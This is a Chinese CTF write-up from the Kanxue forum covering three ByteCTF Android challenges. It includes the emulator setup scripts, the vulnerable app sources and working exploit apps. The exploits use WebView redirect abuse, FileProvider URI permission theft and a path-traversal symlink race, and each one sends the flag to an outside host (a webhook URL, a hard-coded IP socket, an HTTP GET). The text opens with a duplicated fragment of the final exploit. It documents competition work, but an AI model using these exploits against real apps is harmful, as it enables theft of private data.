 private String readUri(Uri uri) { InputStream inputStream = null; try { ContentResolver contentResolver = getContentResolver(); inputStream = contentResolver.openInputStream(uri); if (inputStream != null) { byte[] buffer = new byte[1024]; int result; String content = ""; while ((result = inputStream.read(buffer)) != -1) { content = content.concat(new String(buffer, 0, result)); } return content; } } catch (IOException e) { Log.e("receiver", "IOException when reading uri", e); } catch (IllegalArgumentException e) { Log.e("receiver", "IllegalArgumentException", e); } finally { if (inputStream != null) { try { inputStream.close(); } catch (IOException e) { Log.e("receiver", "IOException when closing stream", e); } } } return null; } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
 String root = getApplicationInfo().dataDir; symlink = root + "/symlink"; try {
 Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }
 String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" + "data%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"; //String path = "content://slipme/sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1"; new Thread(() -> { while (true) { try { Thread.sleep(1); Runtime.getRuntime().exec("ln -sf /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1 " + symlink).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } }).start();
 new Thread(() -> { while (true) { try { Thread.sleep(1); Runtime.getRuntime().exec("ln -sf /data/data/com.bytectf.golddroid/files/flag " + symlink).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } }).start();
 new Thread(() -> { while (true) { try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } String data = readUri(Uri.parse(path)); if(data.length()>0){ Log.e("has_data",data); httpGet(data); }
 } }).start(); }}

本地拿到flag，也可以翻日志看。

题目链接：链接: https://pan.baidu.com/s/1xfk8M2ToEjRn0sldkUBZuA 提取码: eeee

参考链接：

看雪ID：e*16 a

https://bbs.pediy.com/user-home-922338.htm

*本文由看雪论坛 e*16 a 原创，转载请注明来自看雪社区

# 往期推荐

1.CVE-2022-21882提权漏洞学习笔记

2.wibu证书 – 初探

3.win10 1909逆向之APIC中断和实验

4.EMET下EAF机制分析以及模拟实现

5.sql注入学习分享

6.V8 Array.prototype.concat函数出现过的issues和他们的POC们

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
一
前置知识
```



```
1.显示和渲染web界面2.直接使用html进行布局3.与js进行交互
```



```
<WebView android:id="@+id/eeeewebview" android:layout_width="0dp" android:layout_height="0dp" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" />
```



```
public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
 // WebView WebView webView = (WebView) findViewById(R.id.eeeewebview); webView.loadUrl("https://www.baidu.com"); webView.setWebViewClient(new WebViewClient(){ @Override public boolean shouldOverrideUrlLoading(WebView view, String url) { //使用WebView加载显示url view.loadUrl(url); //返回true return true; } });
```



```
大致为[scheme:]scheme-specific-part[#fragment]细分为[scheme:][//authority][path][?query][#fragment]
```



```
http://www.eeeeeeeeeeeeeeeea.cn/about?id=1
```



```
Intent intent = new Intent(Intent.ACTION_MAIN);intent.addCategory(Intent.CATEGORY_LAUNCHER); ComponentName cn = new ComponentName(packageName, className); intent.setComponent(cn);startActivity(intent);
```



```
二
题目环境布置
```



```
am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'
```



```
am start -a android.intent.action.VIEW -d https://www.baidu.com
```



```
<uses-permission android:name="android.permission.INTERNET"/>

<application android:usesCleartextTraffic="true"
```



```
三
Silver Droid
```



```
#!/usr/bin/env python3import os import randomimport subprocessimport sysimport timeimport requestsimport uuidfrom hashlib import *import zipfileimport signalimport string
isMacos = len(sys.argv) == 2wordlist = string.ascii_lettersdifficulty = 4random_hex = lambda x: ''.join([random.choice(wordlist) for _ in range(x)])ADB_PORT = int(random.random() * 60000 + 5000)EMULATOR_PORT = 36666 if isMacos else (ADB_PORT + 1)EXPLOIT_TIME_SECS = 30APK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app-debug.apk")FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag")HOME = "/home/user"VULER = "com.bytectf.silverdroid"

ENV = {}ENV.update(os.environ)if not isMacos: ENV.update({ "ANDROID_ADB_SERVER_PORT": "{}".format(ADB_PORT), "ANDROID_SERIAL": "emulator-{}".format(EMULATOR_PORT), "ANDROID_SDK_ROOT": "/opt/android/sdk", "ANDROID_SDK_HOME": HOME, "ANDROID_PREFS_ROOT": HOME, "ANDROID_EMULATOR_HOME": HOME + "/.android", "ANDROID_AVD_HOME": HOME + "/.android/avd", "JAVA_HOME": "/usr/lib/jvm/java-11-openjdk-amd64", "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "") })

def print_to_user(message): print(message) sys.stdout.flush()
def download_file(url): try: download_dir = "download" if not os.path.isdir(download_dir): os.mkdir(download_dir) tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk') f = requests.get(url) if len(f.content) > 10*1024*1024: # Limit size 10M return None with open(tmp_file, 'wb') as fp: fp.write(f.content) return tmp_file except: return None
def proof_of_work(): print_to_user(f"First, to ensure that the service will not be dos, please answer me a question.") prefix = random_hex(6) suffix = random_hex(difficulty) targetHash = sha256((prefix+suffix).encode()).hexdigest() print_to_user(f'Question: sha256(("{prefix}"+"{"x"*difficulty}").encode()).hexdigest() == "{targetHash}"') print_to_user(f'Please enter the {"x"*difficulty} to satisfy the above equation:') proof = sys.stdin.readline().strip() return sha256((prefix+proof).encode()).hexdigest() == targetHash

def check_apk(path): # return True try: z = zipfile.ZipFile(path) for f in z.filelist: if f.filename == "AndroidManifest.xml": return True return False except: return False
def setup_emulator():
 #avdmanager是一个命令行工具，可以用于从命令行创建和管理 Android 虚拟设备 (AVD)，借助 AVD，您可以定义要在 Android 模拟器中模拟的 Android 手机 subprocess.call( "avdmanager" + " create avd" + " --name 'pixel_xl_api_30'" + " --abi 'google_apis/x86_64'" + " --package 'system-images;android-30;google_apis;x86_64'" + " --device pixel_xl" + " --force" + ("" if isMacos else " > /dev/null 2> /dev/null"), env=ENV, close_fds=True, shell=True)
 return subprocess.Popen( "emulator" + " -avd pixel_xl_api_30" + " -no-cache" + " -no-snapstorage" + " -no-snapshot-save" + " -no-snapshot-load" + " -no-audio" + " -no-window" + " -no-snapshot" + " -no-boot-anim" + " -wipe-data" + " -accel on" + " -netdelay none" + " -no-sim" + " -netspeed full" + " -delay-adb" + " -port {}".format(EMULATOR_PORT) + ("" if isMacos else " > /dev/null 2> /dev/null ") + "", env=ENV, close_fds=True, shell=True, #通过操作系统的 shell 执行指定的命令 preexec_fn=os.setsid)
def adb(args, capture_output=True): #执行adb命令 return subprocess.run( # "adb {}".format(" ".join(args)) + # ("" if isMacos else " 2> /dev/null"), ['adb'] + (['-s', 'emulator-36666']+args if isMacos else args), env=ENV, # shell=True, close_fds=True, capture_output=capture_output).stdout
def adb_install(apk): adb(["install", "-t", apk])
def adb_activity(activity, extras=None, wait=False, data=None): args = ["shell", "am", "start"] if wait: args += ["-W"] args += ["-n", activity] if extras: for key in extras: args += ["-e", key, extras[key]] if data: args += ["-d", data] adb(args)
def adb_broadcast(action, receiver, extras=None): args = ["shell", "su", "root", "am", "broadcast", "-W", "-a", action, "-n", receiver] if extras: for key in extras: args += ["-e", key, extras[key]] adb(args)

print_to_user(r"""[0;1;35;95m░█[0;1;31;91m▀▀[0;1;33;93m░█[0;1;32;92m░░[0;1;36;96m░▀[0;1;34;94m█▀[0;1;35;95m░█[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m▀▀[0;1;36;96m░█[0;1;34;94m▀▄[0;1;35;95m░█[0;1;31;91m▀▄[0;1;33;93m░█[0;1;32;92m▀▄[0;1;36;96m░█[0;1;34;94m▀█[0;1;35;95m░▀[0;1;31;91m█▀[0;1;33;93m░█[0;1;32;92m▀▄[0m[0;1;31;91m░▀[0;1;33;93m▀█[0;1;32;92m░█[0;1;36;96m░░[0;1;34;94m░░[0;1;35;95m█░[0;1;31;91m░▀[0;1;33;93m▄▀[0;1;32;92m░█[0;1;36;96m▀▀[0;1;34;94m░█[0;1;35;95m▀▄[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m░█[0;1;36;96m▀▄[0;1;34;94m░█[0;1;35;95m░█[0;1;31;91m░░[0;1;33;93m█░[0;1;32;92m░█[0;1;36;96m░█[0m[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░░[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m░▀[0;1;33;93m░▀[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m░▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀░[0m""")
if not isMacos: if not proof_of_work(): print_to_user("Please proof of work again, exit...n") exit(-1)
print_to_user("Please enter your poc url:")url = sys.stdin.readline().strip()# url should be like "https://xxx" to to ensure that `adb shell` passes intent.data correctly.if url.strip('"') == url: url = f'"{url}"'if not url.startswith('"https://'): print_to_user("Invalid poc url.n") exit(-1)
print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()#只有连接上了模拟器/设备连接上了adb，服务才会被执行，而在Android系统完全启动前执行就会有错误发生adb(["wait-for-device"])
adb_install(APK_FILE) #将apk文件装到模拟器中with open(FLAG_FILE, "r") as f: adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})#adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'#am broadcast 发送广播#-a com.wuhengctf.SET_FLAG:指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent(); intent.setAction("android.SET_FLAG");#-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者#-e 'flag' 'flag{eeeeeeee}': 字符串

adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)# adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"#-n "com.bytectf.silverdroid/.MainActivity":启动MainActivity#-d "url":传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url

print_to_user("Launching! Let your apk fly for a while...n")
if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
print_to_user("exiting......")
try: os.killpg(os.getpgid(emulator.pid), signal.SIGTERM) os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)except: pass
```



```
package com.bytectf.silverdroid;
import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.webkit.WebResourceRequest;import android.webkit.WebResourceResponse;import android.webkit.WebView;import android.webkit.WebViewClient;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.util.HashMap;
public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app if(uri0 != null) { //若参数不为null WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开 @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { //当shouldOverrideUrlLoading返回值为true，拦截webview加载url try { Uri uri0 = Uri.parse(url); //解析url Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240"); if(uri0.getScheme().equals("https")) { //scheme必须是https return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url } } catch(Exception e) { e.printStackTrace(); return true; }
 return true; } }); webView.setWebViewClient(new WebViewClient() { @Override // android.webkit.WebViewClient public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { //拦截url，js，css等响应阶段,拦截所有的url请求，若返回非空，则不再进行网络资源请求，而是使用返回的资源数据 FileInputStream inputStream; Uri uri0 = request.getUrl(); //获得js请求的request if(uri0.getPath().startsWith("/local_cache/")) { //检查域名后的path是否为/local_cache/开头 File cacheFile = new File(MainActivity.this.getCacheDir(), uri0.getLastPathSegment()); //只是在内存中创建File文件映射对象,而并不会在硬盘中创建文件，新建file以cache为目录，uri0的最后一个地址段 //getCacheDir获取手机中/data/data/包名/cache目录；
 if(cacheFile.exists()) { //若映射的文件真实存在，则进入下面循环 try { inputStream = new FileInputStream(cacheFile);//其将文件内容读取到了内存inputStream内，之后可以进行读取操作 } catch(IOException e) { return null; }
 HashMap headers = new HashMap(); headers.put("Access-Control-Allow-Origin", "*"); return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream); //返回响应 } }
 return super.shouldInterceptRequest(view, request); } }); this.setContentView(webView); // webView.getSettings().setJavaScriptEnabled(true); //设置WebView属性，能够执行Javascript脚本 webView.loadUrl("https://bytectf-1303079954.cos.ap-nanjing.myqcloud.com/jump.html?url=" + uri0); } }}
```



```
<h1>jump</h1><script> function getQueryVariable(variable){ var query = window.location.search.substring(1); //window.location是获得当前页面的url地址，添上search之后表示从"?"开始的url，而substring(1)就是将"?"截掉。
 var vars = query.split("&"); //把query以"&"进行分割 for (var i=0;i<vars.length;i++) { var pair = vars[i].split("="); if(pair[0] == variable){return pair[1];} } return(false); //获得url参数 } var myurl = getQueryVariable("url").toString().toLowerCase();// if (myurl != 'false' && myurl.length > 1 && myurl.indexOf("myqcloud")==-1) { //myurl不能含有myqcloud window.location.href = myurl; //只表示打开这个url页面，并不是打开且刷新这个页面 }</script>
```



```
<script> async function fetchTest(){
 fetch("https://webhook.site/bf5aa6d4-1b89-4eaf-a1dd-9b003555cd99/?flag=123")} (async () => {await fetchTest();})();</script>
```



```
四
Bronze Droid
```



```
print_to_user("Please enter your apk url:")url = sys.stdin.readline().strip()EXP_FILE = download_file(url)if not check_apk(EXP_FILE): print_to_user("Invalid apk file.n") exit(-1)
print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()adb(["wait-for-device"])
adb_install(APK_FILE) #安装受害者apkwith open(FLAG_FILE, "r") as f: adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})
time.sleep(3)adb_install(EXP_FILE) #安装恶意apkadb_activity(f"{ATTACKER}/.MainActivity") #启动恶意apk的MainActivity
print_to_user("Launching! Let your apk fly for a while...n")
```



```
package com.bytectf.bronzedroid;
import android.app.Activity;import android.os.Bundle;
public class MainActivity extends Activity { @Override // android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性 if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断 this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity this.finish(); } }}
```



```
package com.eeeetest.bronzedroid_pwn;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.widget.TextView;
import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.OutputStream;import java.net.HttpURLConnection;import java.net.Socket;import java.net.URL;
public class MainActivity extends AppCompatActivity {
 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);

 Intent intent = new Intent(); intent.setAction("ACTION_SHARET_TO_ME"); intent.setClassName("com.bytectf.bronzedroid","com.bytectf.bronzedroid.MainActivity"); intent.setData(Uri.parse("content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag")); intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); startActivityForResult(intent,1); }
 @Override //重写 public void onActivityResult(int requestCode, int resultCode, Intent data) { //得到回传的数据 super.onActivityResult(requestCode, resultCode, data); //重写 try { InputStreamReader inputStreamReader = new InputStreamReader(getContentResolver().openInputStream(data.getData())); char[] cArr = new char[1024]; StringBuffer stringBuffer = new StringBuffer(""); while (-1 != inputStreamReader.read(cArr, 0, 1024)) { stringBuffer.append(String.valueOf(cArr)); } //send(new String(stringBuffer)); String flag = new String(stringBuffer); ((TextView) findViewById(R.id.tv_show)).setText(new String(stringBuffer));

 } catch (Exception e) { e.printStackTrace(); } } }
```



```
private void send(final String str) { //和服务器建立socket通信，将flag带入到服务器内 new Thread() { @Override public void run() { try { Socket socket = new Socket("47.101.67.103", 1235); sleep(1000L); if (socket.isConnected()) { System.out.println("connect succeed!"); OutputStream outputStream = socket.getOutputStream(); outputStream.write(str.getBytes()); outputStream.flush(); outputStream.close(); socket.close(); } } catch (Exception unused) { } } }.start();}
```



```
五
Gold Droid
```



```
print_to_user("Please enter your apk url:")url = sys.stdin.readline().strip()EXP_FILE = download_file(url)if not check_apk(EXP_FILE): print_to_user("Invalid apk file.n") exit(-1)
print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()adb(["wait-for-device"])
adb_install(APK_FILE) #安装受害apkadb_activity(f"{VULER}/.MainActivity") ###### 启动受害apk的MainActivitywith open(FLAG_FILE, "r") as f: adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()}) #发送flag
time.sleep(3)adb_install(EXP_FILE)adb_activity(f"{ATTACKER}/.MainActivity") #运行恶意apk的MainActivity
print_to_user("Launching! Let your apk fly for a while...n")
if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
print_to_user("exiting......")
```



```
package com.bytectf.golddroid;
import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.nio.charset.StandardCharsets;
public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件 try { FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件 fileOutputStream.write("I'm in externaln".getBytes(StandardCharsets.UTF_8)); //写入 fileOutputStream.close(); } catch(IOException e) { e.printStackTrace(); } }}
```



```
package com.bytectf.golddroid;
import android.content.ContentProvider;import android.content.ContentValues;import android.database.Cursor;import android.net.Uri;import android.os.ParcelFileDescriptor;import java.io.File;import java.io.FileNotFoundException;import java.io.IOException;
public class VulProvider extends ContentProvider { // @Override // android.content.ContentProvider public int delete(Uri uri, String selection, String[] selectionArgs) { return 0; }
 @Override // android.content.ContentProvider public String getType(Uri uri) { return null; }
 @Override // android.content.ContentProvider public Uri insert(Uri uri, ContentValues values) { return null; }
 @Override // android.content.ContentProvider public boolean onCreate() { return false; }
 @Override // android.content.ContentProvider public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException { File file0 = this.getContext().getExternalFilesDir("sandbox"); // file0 = /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/ File file = new File(this.getContext().getExternalFilesDir("sandbox"), uri.getLastPathSegment()); // // file = /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/uri.getLastPathSegment() try { if(!file.getCanonicalPath().startsWith(file0.getCanonicalPath())) { //防止目录穿越,getCanonicalPath会将目录中存在./和../的路径全部转化成没有./和../的路径，下面例子 //Path: workspace/test/../../../.././test1.txt //getAbsolutePath:/Users/eeee/Desktop/CTF/ByteCTF/Gold_Droid/workspace/test/../../../.././test1.txt //getCanonicalPath: /Users/eeee/Desktop/CTF/test1.txt throw new IllegalArgumentException(); } } catch(IOException e) { e.printStackTrace(); }
 return ParcelFileDescriptor.open(file, 0x10000000); //0x10000000代表只读 }
 @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { return null; }
 @Override // android.content.ContentProvider public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { return 0; }}
```



```
public static ParcelFileDescriptor open(File file, int mode) throws FileNotFoundException { final FileDescriptor fd = openInternal(file, mode); if (fd == null) return null; return new ParcelFileDescriptor(fd);}
```



```
private static FileDescriptor openInternal(File file, int mode) throws FileNotFoundException { final int flags = FileUtils.translateModePfdToPosix(mode) | ifAtLeastQ(O_CLOEXEC); int realMode = S_IRWXU | S_IRWXG; if ((mode & MODE_WORLD_READABLE) != 0) realMode |= S_IROTH; if ((mode & MODE_WORLD_WRITEABLE) != 0) realMode |= S_IWOTH; final String path = file.getPath(); //重新获得了path，没有用getCanonicalPath过滤，这样就存在目录穿越 try { return Os.open(path, flags, realMode); } catch (ErrnoException e) { throw new FileNotFoundException(e.getMessage()); }}
```



```
package com.bytectf.test;
import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.IOException;

import android.net.Uri;import android.os.Bundle;
public class MainActivity extends AppCompatActivity {
 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); File file0 = new File("/data/data/com.bytectf.pwngolddroid/","cache"); //取得相对路径 System.out.println("file0 Path: " + file0.getPath());
 String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"; Uri uri = Uri.parse(path); System.out.println("uri.getLastPathSegment:"+uri.getLastPathSegment()); //利用"%2F"绕过getLastPathSegment，让其存在目录穿越
 File file = new File(this.getExternalFilesDir("sandbox"),"../../../../../../../../data/data/com.bytectf.pwngolddroid/symlink"); File file1 = new File(this.getExternalFilesDir("sandbox"),uri.getLastPathSegment()); File file2 = new File(this.getExternalFilesDir("sandbox"),"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"); System.out.println("file Path: " + file.getPath()); System.out.println("file1 Path: " + file1.getPath()); System.out.println("file2 Path: " + file2.getPath()); try { System.out.println("file1.getCanonicalPath:"+file1.getCanonicalPath()); } catch (IOException e) { e.printStackTrace(); }
 try { if(!file1.getCanonicalPath().startsWith(file0.getCanonicalPath())) { ///////////// throw new IllegalArgumentException(); } } catch(IOException e) { e.printStackTrace(); } //取得绝对路径// try{// System.out.println("getCanonicalPath: "+ file.getCanonicalPath()); }// catch(Exception e){} }

 }
```



```
package com.bytectf.pwngolddroid;
import androidx.appcompat.app.AppCompatActivity;import android.content.ContentResolver;import android.net.Uri;import android.os.Bundle;import android.util.Log;
import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.net.HttpURLConnection;import java.net.URL;

public class MainActivity extends AppCompatActivity { String symlink;
 public void httpGet(String msg) { new Thread(new Runnable() { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { Log.e("in_httpGet","inHttpGet1"); URL url = new URL("http://ip:port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log Thread.sleep(1); Log.e("in_httpGet","inHttpGet2"); connection = (HttpURLConnection) url.openConnection(); Thread.sleep(1); Log.e("in_httpGet","inHttpGet3"); connection.setRequestMethod("GET"); Thread.sleep(1); Log.e("in_httpGet","inHttpGet4"); connection.getInputStream(); Thread.sleep(1); Log.e("httpget succeed","http_get succeed"); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } }).start(); }
 private String readUri(Uri uri) { InputStream inputStream = null; try { ContentResolver contentResolver = getContentResolver(); inputStream = contentResolver.openInputStream(uri); if (inputStream != null) { byte[] buffer = new byte[1024]; int result; String content = ""; while ((result = inputStream.read(buffer)) != -1) { content = content.concat(new String(buffer, 0, result)); } return content; } } catch (IOException e) { Log.e("receiver", "IOException when reading uri", e); } catch (IllegalArgumentException e) { Log.e("receiver", "IllegalArgumentException", e); } finally { if (inputStream != null) { try { inputStream.close(); } catch (IOException e) { Log.e("receiver", "IOException when closing stream", e); } } } return null; } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
 String root = getApplicationInfo().dataDir; symlink = root + "/symlink"; try {
 Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }
 String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" + "data%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"; //String path = "content://slipme/sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1"; new Thread(() -> { while (true) { try { Thread.sleep(1); Runtime.getRuntime().exec("ln -sf /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1 " + symlink).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } }).start();
 new Thread(() -> { while (true) { try { Thread.sleep(1); Runtime.getRuntime().exec("ln -sf /data/data/com.bytectf.golddroid/files/flag " + symlink).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } }).start();
 new Thread(() -> { while (true) { try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } String data = readUri(Uri.parse(path)); if(data.length()>0){ Log.e("has_data",data); httpGet(data); }
 } }).start(); }}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1672014301.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1672014302.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1672014303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/10-1672014309.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/6-1672014309.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1672014310.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/8-1672014311.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/8-1672014312.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/0-1672014312.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/7-1672014313.png)